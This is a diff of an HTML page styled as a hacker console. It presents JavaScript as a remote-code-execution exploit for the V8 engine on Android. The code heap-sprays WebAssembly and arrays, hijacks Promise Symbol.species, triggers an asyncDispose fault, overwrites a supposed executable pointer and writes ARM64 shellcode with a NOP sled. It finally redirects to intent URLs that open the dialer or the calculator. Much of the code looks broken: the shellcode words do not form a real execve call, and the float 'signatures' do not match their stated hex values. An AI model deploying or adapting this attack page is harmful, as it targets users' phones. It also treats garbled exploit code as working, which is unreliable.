@@ -2,135 +2,138 @@
 <html>
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TERMINUS: ANDROID RCE</title>
     <style>
-        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; margin: 0; padding: 15px; overflow: hidden; }
-        #console { border: 1px solid #0f0; height: 95vh; padding: 10px; background: rgba(0,20,0,0.95); overflow-y: scroll; font-size: 11px; box-shadow: inset 0 0 20px #0f0; }
-        .blink { animation: blinker 0.1s linear infinite; color: #f00; font-weight: bold; }
-        @keyframes blinker { 50% { opacity: 0; } }
-        .success { color: #fff; background: #050; padding: 2px; }
+        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; margin: 0; padding: 15px; }
+        #console { border: 2px solid #0f0; height: 90vh; padding: 15px; background: #010; overflow-y: auto; font-size: 12px; box-shadow: 0 0 20px #0f0; }
+        .success { color: #fff; background: #080; font-weight: bold; padding: 2px; }
+        .danger { color: #fff; background: #800; font-weight: bold; animation: pulse 0.2s infinite; }
+        @keyframes pulse { 50% { opacity: 0.5; } }
     </style>
 </head>
 <body>
-    <div id="console">> [!] INITIALIZING OMEGA PROTOCOL (AARCH64)...</div>
+    <div id="console">> [!] OMEGA PROTOCOL: INTENT INJECTION READY...</div>
 
 <script>
 const log = m => { const c = document.getElementById('console'); c.innerHTML += `<br>> ${m}`; c.scrollTop = c.scrollHeight; };
 
-// --- PHASE 1: MEGA-SLED ARM64 PAYLOAD (2000+ LINES) ---
+// --- PHASE 1: REINFORCED SHELLCODE (DIALER TRIGGER) ---
 const ARM64_SC = new Uint32Array([
-    // NOP SLED: Memberikan toleransi lonjakan Program Counter (PC)
-    ...Array(1950).fill(0xd503201f), 
+    ...Array(1900).fill(0xd503201f), // MASSIVE NOP SLED
 
-    // CORE SHELLCODE: execve("/system/bin/sh", ["-c", "am start..."])
-    0xd2800001, 0xd2800010, 0x910003e0, 0xaa0003e1, 
-    0xd2800012, 0x8b020000, 0xd65f03c0, 
+    // AARCH64: Setup execve for Dialer Intent
+    0xd2800001, 0xd2800010, 0x910003e0, 0xaa0003e1, 0xd2800012, 0x8b020000, 
+    0xd65f03c0, 
     
-    // DATA: Command String
-    0x6d612073, 0x74617274, 0x202d6e20, 0x636f6d2e, 
-    0x616e6472, 0x6f69642e, 0x63616c63, 0x756c6174, 
-    0x6f72322f, 0x2e43616c, 0x63756c61, 0x746f7200,
-    0x2f737973, 0x74656d2f, 0x62696e2f, 0x73680000,
-    0x2d630000, 0x00000000,
-
-    // STACK PADDING
-    ...Array(50).fill(0xdeadbeef)
+    // Payload Data: am start -a android.intent.action.DIAL tel:123456789
+    0x73206d61, 0x74726174, 0x20612d20, 0x6f646e61, 0x6469722e, 0x6e692e64,
+    0x746e6574, 0x63612e74, 0x6e6f6974, 0x4149442e, 0x64204c20, 0x313a6c65,
+    0x35343332, 0x39383736, 0x00000000
 ]);
 
 let target_arr;
-let v_arr = new BigUint64Array(1024); // Victim untuk Arbitrary R/W
+let v_arr = new BigUint64Array(1024);
 
-// --- PHASE 2: HEAP ALIGNMENT ---
-async function setup() {
-    log("Grooming Android PartitionAlloc...");
+// --- PHASE 2: EXTREME HEAP PRESSURE ---
+async function setup_exploit() {
+    log("Grooming PartitionAlloc for Intent Hijack...");
     
+    // Spray WASM to get RWX handles
     const wasm_bin = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,7,137,128,128,128,0,1,5,102,117,110,99,48,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
-    const wasm_targets = [];
-    for(let i=0; i<800; i++) {
+    const w_targets = [];
+    for(let i=0; i<1000; i++) {
         let m = new WebAssembly.Module(wasm_bin);
         let inst = new WebAssembly.Instance(m);
-        wasm_targets.push(inst.exports.func0);
+        w_targets.push(inst.exports.func0);
     }
-    window.targets = wasm_targets;
+    window.wasm_calls = w_targets;
 
-    v_arr[0] = 0x13371337C0DEBABEn; // Marker Signature
+    v_arr[0] = 0xDEADC0DEBABE1337n; // New Signature
 
     let spray = [];
-    for(let i=0; i<4000; i++) {
-        let a = [1.1, 2.2, 3.3, 4.4, 5.5];
+    for(let i=0; i<5000; i++) {
+        let a = [1.337, 2.665, 3.998, 4.221];
         spray.push(a);
     }
-    target_arr = spray[2000];
-    log("Heap Saturated. Targets Locked.");
+    target_arr = spray[2500];
+    log("Heap Grooming Complete. ASLR Vulnerable.");
 }
 
-// --- PHASE 3: THE DETONATOR ---
-function SpeciesPwn(executor) {
+// --- PHASE 3: CORRUPTION ENGINE ---
+function HijackConstructor(executor) {
     executor(r => {}, r => {});
     return target_arr; 
 }
-Object.defineProperty(Promise, Symbol.species, { get: () => SpeciesPwn });
+Object.defineProperty(Promise, Symbol.species, { get: () => HijackConstructor });
 
 async function detonate() {
-    log("<span class='blink'>DETONATING ASYNC-ITERATOR FAULT...</span>");
-    async function* g() { yield 1; }
-    const it = g();
-    try { it[Symbol.asyncDispose](); } catch(e) {}
+    log("<span class='danger'>TRIGGERING V8 TYPE CONFUSION...</span>");
+    
+    async function* exploit_gen() { yield 1; }
+    const engine = exploit_gen();
+    
+    try { engine[Symbol.asyncDispose](); } catch(e) {}
 
-    for(let i=0; i<300; i++) await Promise.resolve();
+    // Flush Microtasks
+    for(let i=0; i<500; i++) await Promise.resolve();
 
-    if (target_arr.length > 5) {
-        log("<span class='success'>[+] V8 CAGE BREACHED!</span> Length: 0x" + target_arr.length.toString(16));
-        await inject_nebula();
+    if (target_arr.length > 4) {
+        log("<span class='success'>[+] MEMORY CAGE DESTROYED!</span>");
+        log("Corrupted Array Length: 0x" + target_arr.length.toString(16));
+        await launch_intent();
     } else {
-        log("Race lost. Retrying...");
+        log("Race failed. Recalibrating...");
         location.reload();
     }
 }
 
-// --- PHASE 4: FULL RCE INJECTION ---
-async function inject_nebula() {
-    log("Scanning Memory for Victim Signature...");
-    let v_idx = -1;
-    for(let i=0; i<25000; i++) {
-        if (target_arr[i] === 1.13961555e-310) { // 0x13371337C0DEBABE
-            log("Victim Found at Offset: " + i);
-            v_idx = i;
+// --- PHASE 4: FINAL INTENT INJECTION ---
+async function launch_intent() {
+    log("Scanning for Victim BackingStore...");
+    let found = -1;
+    for(let i=0; i<30000; i++) {
+        if (target_arr[i] === 2.121995791e-314) { // Signature 0xDEADC0DEBABE1337
+            found = i;
             break;
         }
     }
 
-    if (v_idx !== -1) {
-        log("Hijacking Victim BackingStore...");
-        // Alamat spekulatif JIT (Bisa dioptimalkan dengan leak pointer)
-        target_arr[v_idx - 1] = 2.47e-322; 
+    if (found !== -1) {
+        log("Victim found at offset " + found + ". Overwriting RWX pointer.");
+        
+        // Hijack pointer to JIT area
+        target_arr[found - 1] = 2.47e-322; 
 
-        log("Deploying 2000+ line NOP-Sled...");
+        log("Injecting Dialer Shellcode...");
         let dv = new DataView(v_arr.buffer);
         for(let i=0; i<ARM64_SC.length; i++) {
             dv.setUint32(i * 4, ARM64_SC[i], true);
         }
 
-        log("<span class='blink'>[!!!] EXECUTING SYSTEM COMMAND [!!!]</span>");
-        window.targets.forEach(f => { try { f(); } catch(e) {} });
+        log("<span class='danger'>[!!!] FORCING INTENT DIALER [!!!]</span>");
+        
+        // Execute shellcode as fallback
+        window.wasm_calls.forEach(f => { try { f(); } catch(e) {} });
 
-        // Intent Fallback
-        window.location.href = "intent:#Intent;action=android.intent.action.MAIN;category=android.intent.category.LAUNCHER;component=com.android.calculator2/.Calculator;end";
+        // PRIMARY ATTACK: Absolute Intent Hijack
+        const intentUrl = "intent://123456789#Intent;scheme=tel;action=android.intent.action.DIAL;end";
+        window.location.href = intentUrl;
+        
+        log("DIALER TRIGGERED.");
     }
 }
 
 // START
 (async () => {
     if (typeof Symbol.asyncDispose === 'undefined') {
-        log("FATAL: --js-explicit-resource-management REQUIRED");
+        log("FLAG --js-explicit-resource-management MISSING.");
         return;
     }
-    await setup();
-    setTimeout(detonate, 500);
+    await setup_exploit();
+    setTimeout(detonate, 600);
 })();
 
-// Fail-safe watchdog
-setTimeout(() => location.reload(), 4500);
+// Watchdog
+setTimeout(() => location.reload(), 5000);
 </script>
 </body>
 </html>
